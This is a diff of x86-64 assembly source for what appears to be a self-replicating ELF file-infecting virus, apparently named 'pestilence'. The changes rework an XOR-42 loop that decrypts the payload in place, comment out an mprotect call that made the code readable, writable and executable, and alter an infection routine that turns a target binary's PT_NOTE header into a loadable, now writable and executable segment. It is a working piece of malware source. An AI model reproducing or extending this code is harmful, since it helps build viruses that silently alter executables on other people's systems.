@@ -117,17 +117,17 @@ _start:
 
 ; 	cmp rax, 0
 ; 	jl _end
-_mprotect:
-	lea rdi, [rel _start]
-	mov rsi, _end - _start
-	mov r10, rdi
-	and rdi, -0x1000 ; 4096 
-	neg rdi
-	add r10, rdi
-	neg rdi
-	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
-	mov rax, SYS_MPROTECT
-	syscall
+; _mprotect:
+; 	lea rdi, [rel _start]
+; 	mov rsi, _stop - _start
+; 	mov r10, rdi
+; 	and rdi, -0x1000 ; 4096 
+; 	neg rdi
+; 	add r10, rdi
+; 	neg rdi
+; 	mov rdx, 7 ; PROT_READ | PROT_WRITE | PROT_EXEC
+; 	mov rax, SYS_MPROTECT
+; 	syscall
 
 	mov rax, SYS_GETGID
 	syscall
@@ -145,26 +145,29 @@ _is_encrypted:
 	mov r10, 8
 	mov rax, SYS_PREAD64
 	syscall
-
+	mov rdi, [r15 + 1524]
+	mov rax, SYS_CLOSE
+	syscall
 	cmp byte [r15 + 1530], 'I'
 	jne _payload
 	
 _decypher:
-	mov rax, -1 ;i = -1
+	mov r8, 0
 	mov rdx, pestilence - _payload
 	xor r9, r9
-	mov r10, 42
 	call .get_rip
 	.get_rip:
 		pop rbp
 		sub rbp, .get_rip
 	.loop:
-		inc rax
-		lea rsi, [rbp + _payload] ; (rbp + (payload - start ) )
-		; add rsi, _evade_specific_process - _start
-		xor byte [rsi + rax], 42
-		cmp rax, rdx
-		jle .loop
+		lea r10, [rbp + _payload] ; (rbp + (payload - start ) )
+		xor byte [r10 + r8], 42
+		inc r8
+		cmp r8, rdx
+		jl .loop
+	mov rax , SYS_GETUID
+	syscall
+	nop
 	nop
 	nop
 	nop
@@ -580,7 +583,7 @@ _dirent_tmp_test:                                  ; getdents the directory to i
 			mov dword [r15 + 1424], PT_LOAD        ; change PT_NOTE header to PT_LOAD
 
 		_change_mem_protections:
-			mov dword [r15 + 1428], PF_R | PF_X    ; disable memory protections
+			mov dword [r15 + 1428], PF_R | PF_X | PF_W   ; disable memory protections
 			imul rax, rax, 1
 
 		_adjust_mem_vaddr:
